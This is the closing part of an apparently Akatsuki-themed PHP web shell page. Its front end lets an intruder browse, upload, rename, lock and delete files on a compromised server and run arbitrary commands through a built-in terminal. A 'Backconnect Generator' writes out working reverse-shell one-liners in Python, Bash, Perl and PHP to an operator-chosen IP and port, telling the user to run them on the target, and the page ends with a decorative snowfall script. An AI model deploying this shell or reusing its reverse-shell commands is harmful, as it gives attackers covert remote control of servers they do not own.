                <option value="perl">Perl</option>
                <option value="php">PHP</option>
            </select>
            <div class="modal-buttons">
                <button class="modal-btn primary" onclick="generateBackconnect()">
                    <i class="fas fa-code"></i> GENERATE
                </button>
                <button class="modal-btn secondary" onclick="closeModal('backconnectModal')">
                    <i class="fas fa-times"></i> CLOSE
                </button>
            </div>
            <div id="backconnectOutput" class="cmd-output"></div>
        </div>
    </div>
    
    <script>
        // Modal Functions
        function openModal(modalId) {
            document.getElementById(modalId).style.display = 'flex';
            if (modalId === 'cmdModal') {
                setTimeout(() => document.getElementById('cmdInput').focus(), 100);
            }
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }
        
        // File Actions
        function deleteItem(path) {
            if (confirm('Are you sure you want to delete this item?')) {
                window.location.href = '?delete=' + path + '&dir=<?php echo urlencode($currentDir); ?>';
            }
        }
        
        function lockUnlockItem(path, isFolder = false) {
            if (confirm(isFolder ? 'Lock/Unlock folder?' : 'Lock/Unlock file?')) {
                window.location.href = '?lockunlock=' + encodeURIComponent(path) + '&dir=<?php echo urlencode($currentDir); ?>';
            }
        }
        
        function renameItem(path, isFolder = false) {
            const currentName = path.split('/').pop().split('\\').pop();
            const newName = prompt('Enter new name:', currentName);
            if (newName && newName !== currentName) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                
                if (isFolder) {
                    form.innerHTML = `
                        <input type="hidden" name="rename_dir_submit" value="1">
                        <input type="hidden" name="rename_dir" value="${path}">
                        <input type="hidden" name="new_name" value="${newName}">
                    `;
                } else {
                    form.innerHTML = `
                        <input type="hidden" name="rename_file" value="1">
                        <input type="hidden" name="rename" value="${path}">
                        <input type="hidden" name="new_name" value="${newName}">
                    `;
                }
                
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // TERMINAL EXECUTION - FIXED
        function executeCmd() {
            const cmdInput = document.getElementById('cmdInput').value;
            const cmdOutput = document.getElementById('cmdOutput');
            
            if (!cmdInput.trim()) {
                cmdOutput.innerHTML = '<span style="color: #ff0000;">Please enter a command!</span>';
                return;
            }
            
            cmdOutput.innerHTML = '<span style="color: #ffff00;">Executing command...</span>';
            
            // Create form data
            const formData = new FormData();
            formData.append('command', cmdInput);
            
            // Send POST request to same page
            fetch('', {
                method: 'POST',
                headers: {
                    'Accept': 'text/html',
                },
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                cmdOutput.innerHTML = data;
                // Scroll to bottom
                cmdOutput.scrollTop = cmdOutput.scrollHeight;
            })
            .catch(error => {
                cmdOutput.innerHTML = '<span style="color: #ff0000;">Error: ' + error + '</span>';
            });
        }
        
        // UPLOAD FILE - FIXED (using traditional form submit)
        function uploadFile() {
            const form = document.getElementById('uploadForm');
            const fileInput = document.getElementById('fileUpload');
            
            if (!fileInput.files[0]) {
                alert('Please select a file first!');
                return;
            }
            
            // Show loading message
            alert('Uploading file...');
            
            // Submit form normally
            form.submit();
        }
        
        // Create Folder
        function createFolderPrompt() {
            const folderName = prompt('Enter folder name:');
            if (folderName && folderName.trim()) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                form.innerHTML = `
                    <input type="hidden" name="folder_name" value="${folderName}">
                    <input type="hidden" name="new_folder" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Create File
        function createFilePrompt() {
            const fileName = prompt('Enter file name:');
            if (fileName && fileName.trim()) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                form.innerHTML = `
                    <input type="hidden" name="file_name" value="${fileName}">
                    <input type="hidden" name="new_file" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Backconnect Generator
        function generateBackconnect() {
            const ip = document.getElementById('ipAddress').value;
            const port = document.getElementById('port').value;
            const type = document.getElementById('backconnectType').value;
            const output = document.getElementById('backconnectOutput');
            
            let command = '';
            
            switch(type) {
                case 'python':
                    command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                    break;
                case 'bash':
                    command = `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`;
                    break;
                case 'perl':
                    command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    break;
                case 'php':
                    command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    break;
            }
            
            output.innerHTML = '<span style="color: #00ff00;">Copy this command and run on target:</span>\n\n' + command + '\n\n<i style="color: #ff9900;">Note: Make sure listener is running on target machine.</i>';
        }
        
        // Drag and drop for upload
        const uploadArea = document.querySelector('.upload-area');
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = 'var(--akatsuki-red)';
            uploadArea.style.background = 'rgba(255, 0, 0, 0.1)';
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.style.borderColor = 'rgba(255, 0, 0, 0.3)';
            uploadArea.style.background = 'rgba(255, 0, 0, 0.05)';
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = 'rgba(255, 0, 0, 0.3)';
            uploadArea.style.background = 'rgba(255, 0, 0, 0.05)';
            
            const file = e.dataTransfer.files[0];
            if (file) {
                const dataTransfer = new DataTransfer();
                dataTransfer.items.add(file);
                document.getElementById('fileUpload').files = dataTransfer.files;
                uploadFile();
            }
        });
        
        // Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            // Ctrl+Enter in CMD modal
            if (e.ctrlKey && e.key === 'Enter' && document.getElementById('cmdModal').style.display === 'flex') {
                executeCmd();
            }
            // Escape to close modals
            if (e.key === 'Escape') {
                closeModal('cmdModal');
                closeModal('backconnectModal');
            }
            // Ctrl+T for terminal
            if (e.ctrlKey && e.key === 't') {
                e.preventDefault();
                openModal('cmdModal');
            }
        });
    </script>
    <!-- Script Salju Akatsuki -->
<style>
    .akatsuki-snowflake {
        position: fixed;
        top: -20px;
        z-index: 9998;
        pointer-events: none;
        user-select: none;
        color: rgba(255, 0, 0, 0.7);
        text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        font-size: 20px;
        animation: akatsuki-fall linear infinite;
    }
    
    @keyframes akatsuki-fall {
        0% {
            transform: translateY(-20px) rotate(0deg);
            opacity: 1;
        }
        100% {
            transform: translateY(100vh) rotate(720deg);
            opacity: 0;
        }
    }
</style>

<script>
// Script Salju Akatsuki Style
(function() {
    function createAkatsukiSnowflake() {
        var snowflake = document.createElement('div');
        snowflake.className = 'akatsuki-snowflake';
        snowflake.style.left = Math.random() * 100 + 'vw';
        snowflake.style.animationDuration = (Math.random() * 10 + 10) + 's'; // 10-20 detik
        snowflake.style.animationDelay = Math.random() * 5 + 's';
        snowflake.style.opacity = Math.random() * 0.5 + 0.3;
        snowflake.style.fontSize = (Math.random() * 15 + 10) + 'px';
        
        // Gunakan simbol Akatsuki (awan merah) atau bintang
        var symbols = ['❄', '✦', '✧', '❉', '❋', '☁'];
        snowflake.innerHTML = symbols[Math.floor(Math.random() * symbols.length)];
        
        document.body.appendChild(snowflake);

        // Hapus setelah animasi selesai
        setTimeout(function() {
            if (snowflake.parentNode) {
                snowflake.style.opacity = '0';
                snowflake.style.transition = 'opacity 1s';
                setTimeout(function() {
                    if (snowflake.parentNode) {
                        document.body.removeChild(snowflake);
                    }
                }, 1000);
            }
        }, parseFloat(snowflake.style.animationDuration) * 1000);
    }

    // Buat salju pertama
    for (var i = 0; i < 20; i++) {
        setTimeout(createAkatsukiSnowflake, i * 300);
    }

    // Terus buat salju baru
    setInterval(function() {
        createAkatsukiSnowflake();
    }, 800);

    // Kurangi efek saat modal terbuka
    document.addEventListener('DOMContentLoaded', function() {
        var modals = document.querySelectorAll('.modal');
        modals.forEach(function(modal) {
            modal.addEventListener('show', function() {
                document.querySelectorAll('.akatsuki-snowflake').forEach(function(sf) {
                    sf.style.opacity = '0.1';
                });
            });
            modal.addEventListener('hide', function() {
                document.querySelectorAll('.akatsuki-snowflake').forEach(function(sf) {
                    sf.style.opacity = '0.7';
                });
            });
        });
    });
})();
</script>
</body>
</html>
